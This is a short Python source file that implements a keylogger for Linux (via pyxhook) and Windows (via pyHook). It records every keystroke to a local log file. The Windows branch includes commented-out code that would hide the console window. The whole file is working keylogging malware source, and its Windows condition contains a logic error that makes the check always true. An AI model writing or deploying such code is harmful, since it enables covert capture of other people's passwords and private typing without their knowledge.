import sys

print(sys.platform)

if sys.platform == 'linux':
	from Dependencies import pyxhook
	log_file='/root/Documents/file.log'
	def OnKeyPress(event):
		fob=open(log_file,'a')
		fob.write(event.Key)
		fob.write('\n')

		if event.Ascii==96: #96 is the ascii value of the grave key (`)
			fob.close()
			new_hook.cancel()

	#instantiate HookManager class
	new_hook=pyxhook.HookManager()
	#listen to all keystrokes
	new_hook.KeyDown=OnKeyPress
	#hook the keyboard
	new_hook.HookKeyboard()
	#start the session
	new_hook.start()
else:
	import pyHook
	import win32api
	import win32console
	import win32gui
	import pythoncom
	
	#win=win32console.GetConsoleWindow()
	#win32gui.ShowWindow(win,0)
 
	def OnKeyboardEvent(event):
		if event.Ascii !=0 or 8:
		#open output.txt to read current keystrokes
		#	f=open('c:\output.txt','r+')
		#	buffer=f.read()
		#	f.close()
			#open output.txt to write current + new keystrokes
			f=open('c:\output.txt','a')
			keylogs=chr(event.Ascii)
			if event.Ascii==13:
				keylogs='/n'
			#buffer+=keylogs
			f.write(keylogs)
			f.write('\n')
			f.close()
			return True
	# create a hook manager object
	hm=pyHook.HookManager()
	hm.KeyDown=OnKeyboardEvent
	# set the hook
	hm.HookKeyboard()
	# wait forever
	pythoncom.PumpMessages()
